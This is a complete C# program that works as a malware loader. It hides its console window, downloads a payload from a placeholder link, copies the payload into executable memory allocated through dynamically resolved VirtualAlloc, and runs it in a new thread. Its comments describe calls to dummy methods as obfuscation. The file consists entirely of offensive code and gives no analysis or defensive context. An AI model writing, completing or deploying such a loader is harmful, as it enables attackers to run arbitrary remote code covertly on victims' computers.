using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Reflection;

class Program
{
    static void Main(string[] args)
    {
        // Hide the console window
        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // Download payload
        WebClient webClient = new WebClient();
        byte[] payload = webClient.DownloadData("[DOWNLOAD_LINK]");

        // Allocate memory and copy payload
        IntPtr memoryAddress = AllocateExecutableMemory(payload.Length);
        Marshal.Copy(payload, 0, memoryAddress, payload.Length);

        // Create and run the payload thread
        IntPtr threadHandle = CreatePayloadThread(memoryAddress);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);

        // Call a random benign method to obfuscate further
        ExecuteRandomMethod();
    }

    static IntPtr AllocateExecutableMemory(int size)
    {
        IntPtr kernel32 = LoadLibrary("kernel32.dll");
        IntPtr allocAddress = GetProcAddress(kernel32, "VirtualAlloc");
        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(allocAddress, typeof(VirtualAllocDelegate));
        return virtualAlloc(IntPtr.Zero, (uint)size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
    }

    static IntPtr CreatePayloadThread(IntPtr memoryAddress)
    {
        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, memoryAddress, IntPtr.Zero, 0, IntPtr.Zero);
        if (threadHandle == IntPtr.Zero)
        {
            throw new Exception("Failed to create thread.");
        }
        return threadHandle;
    }

    static void ExecuteRandomMethod()
    {
        MethodInfo[] methods = typeof(ObfuscationHelper).GetMethods(BindingFlags.Public | BindingFlags.Static);
        Random random = new Random();
        int randomIndex = random.Next(methods.Length);
        methods[randomIndex].Invoke(null, null);
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string dllName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;

    private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [Flags]
    enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000
    }

    [Flags]
    enum MemoryProtection
    {
        ExecuteReadWrite = 0x40
    }
}

class ObfuscationHelper
{
    public static void DummyMethod1()
    {
        Console.WriteLine("Executing DummyMethod1.");
    }

    public static void DummyMethod2()
    {
        Console.WriteLine("Executing DummyMethod2.");
    }

    public static void DummyMethod3()
    {
        Console.WriteLine("Executing DummyMethod3.");
    }

    public static void DummyMethod4()
    {
        Console.WriteLine("Executing DummyMethod4.");
    }
}
